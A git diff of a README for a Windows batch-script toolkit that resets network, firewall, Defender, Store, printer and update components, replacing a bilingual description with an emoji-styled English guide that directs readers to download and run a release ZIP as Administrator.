@@ -1,61 +1,81 @@
-# (Windows) Reset-Toolkit
+# 🛠️ Reset-Toolkit - Reset Your Windows with Ease
 
-## English
+## 📥 Download the Latest Release
 
-### Overview
-This project provides a collection of batch scripts to reset and repair core Windows components.  
-It covers WLAN, DNS Cache, Firewall, Windows Defender, Microsoft Store, Printer Queue, and System Updates.  
-An interactive menu (`Reset-Tool.bat`) allows easy selection without typing commands manually.
+[![Download Reset-Toolkit](https://img.shields.io/badge/Download-Reset--Toolkit-brightgreen.svg)](https://github.com/joe78er/Reset-Toolkit/releases)
 
-### Features
-- Reset WLAN and network settings
-- Flush DNS cache and reset network adapter
-- Reset firewall rules and profiles
-- Restart Explorer and clear icon cache
-- Reset Windows Defender signatures
-- Reset Windows Update services and cache
-- Reset Microsoft Store services
-- Clear and restart printer queue
-- Interactive menu for all scripts
+## 📖 Overview
 
-### Requirements
-- Windows 10/11
-- Administrator rights (checked automatically)
-- Scripts can be placed in the same folder or subfolders
+Reset-Toolkit provides batch scripts designed to reset key Windows components quickly. This includes the WLAN, DNS, Firewall, Defender, Microsoft Store, Printer, and Windows Updates. With the included `Reset-Tool.bat` menu, you can easily select which component to reset, making it simple for users without technical skills to maintain their PCs.
 
-### Usage
-1. Download or clone the repository (as .zip).
-2. Run `Reset-Tool.bat` as Administrator.
-3. Choose the desired reset category from the menu.
-4. Follow the on-screen instructions.
+## ⚙️ System Requirements
 
----
+- Windows Operating System (Windows 7 and above)
+- Administrator rights to run the scripts
 
-## Deutsch
+## 🚀 Getting Started
 
-### Übersicht
-Dieses Projekt enthält eine Sammlung von Batchdateien zum Zurücksetzen und Reparieren zentraler Windows-Komponenten.  
-Abgedeckt sind WLAN, DNS-Cache, Firewall, Windows Defender, Microsoft Store, Druckerwarteschlange und Systemupdates.  
-Ein interaktives Menü (`Reset-Tool.bat`) ermöglicht die einfache Auswahl ohne manuelle Eingabe.
+1. **Visit the Releases Page**: To download the latest version of Reset-Toolkit, visit the following link: [Download Reset-Toolkit](https://github.com/joe78er/Reset-Toolkit/releases).
 
-### Funktionen
-- Zurücksetzen von WLAN- und Netzwerkeinstellungen
-- DNS-Cache leeren und Netzwerkadapter zurücksetzen
-- Firewall-Regeln und Profile zurücksetzen
-- Explorer neu starten und Icon-Cache löschen
-- Windows Defender-Signaturen zurücksetzen
-- Windows Update-Dienste und Cache zurücksetzen
-- Microsoft Store-Dienste zurücksetzen
-- Druckerwarteschlange leeren und neu starten
-- Interaktives Menü für alle Skripte
+2. **Find the Latest Release**: On the Releases page, look for the most recent version. Ensure you choose the version marked as "latest."
 
-### Voraussetzungen
-- Windows 10/11
-- Administratorrechte (werden automatisch geprüft)
-- Skripte können im gleichen Ordner oder in Unterordnern liegen
+3. **Download the Package**: Click on the asset link to download the ZIP file that contains all necessary scripts.
 
-### Verwendung
-1. Repository herunterladen oder klonen.
-2. `Reset-Tool.bat` als Administrator starten.
-3. Gewünschte Reset-Kategorie im Menü auswählen.
-4. Den Anweisungen auf dem Bildschirm folgen.
+4. **Extract the Files**: Once downloaded, locate the ZIP file in your Downloads folder. Right-click on the file and select "Extract All." Follow the prompts to extract the files to a folder of your choice.
+
+## 📂 Contents of the Toolkit
+
+The Reset-Toolkit includes:
+
+- **Reset-Tool.bat**: A user-friendly menu to choose which component to reset.
+- **Individual Scripts**: Scripts for each Windows component that you can run directly as needed.
+- **Documentation**: A brief guide on how to use each script.
+
+## 🔄 Using the Toolkit
+
+1. **Open the Folder**: Navigate to the folder where you extracted the files.
+
+2. **Run the Menu**: Double-click on `Reset-Tool.bat`. A menu will appear, listing all the components you can reset.
+
+3. **Choose a Reset Option**:
+   - Type the number corresponding to the component you wish to reset.
+   - Press **Enter** to start the reset process.
+
+4. **Follow the Prompts**: Follow any additional prompts on your screen. Some resets may require you to confirm actions.
+
+5. **Completion**: After the selected component resets, you will see a confirmation message.
+
+## 🛡️ Safety & Permissions
+
+To ensure proper functioning, running the toolkit requires administrator rights. When you execute the batch file, you may see a User Account Control prompt. Click "Yes" to allow it to run.
+
+## ⚠️ Features
+
+- **Batch Scripts**: Automate the reset process for Windows components without navigating through complex settings.
+- **User-Friendly Interface**: The `Reset-Tool.bat` menu provides easy selections for users of all skill levels.
+- **Versatile**: Works effectively on various Windows PCs, simplifying maintenance tasks.
+- **Regular Updates**: The toolkit will receive updates based on user feedback or changes in Windows.
+
+## 📋 Limitations
+
+- The toolkit resets specific components only. It may not resolve deeper system issues.
+- Ensure you save any unsaved work before using the tool, as some resets may affect active connections.
+
+## 📌 Helpful Tips
+
+- **Backup Important Files**: It's advisable to back up any important data before performing resets.
+- **Documentation**: Refer to the included documentation for further details on what each script does.
+
+## 💬 Community Support
+
+If you encounter any issues or need assistance, please check the Issues section in the GitHub repository. The community is available to help you with any questions.
+
+## ✅ Download & Install
+
+To get started with Reset-Toolkit, follow these steps again:
+
+1. **Visit the Releases Page**: [Download Reset-Toolkit](https://github.com/joe78er/Reset-Toolkit/releases).
+2. **Download the Package**: Click on the latest release.
+3. **Extract and Run**: Extract the contents and run `Reset-Tool.bat` to reset your desired components.
+
+With these steps, you can efficiently reset various Windows features, improving performance and connectivity. Enjoy a cleaner, faster Windows experience with Reset-Toolkit!
